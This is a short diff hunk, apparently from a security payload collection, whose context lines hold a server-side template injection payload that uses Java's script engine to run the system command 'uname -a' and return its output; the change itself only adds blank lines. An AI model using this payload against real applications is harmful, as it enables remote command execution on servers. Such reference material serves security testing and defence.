@@ -20,3 +20,5 @@ updated_at: '2023-04-10T20:23:32.985783+00:00'
 
 {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
 ```
+
+
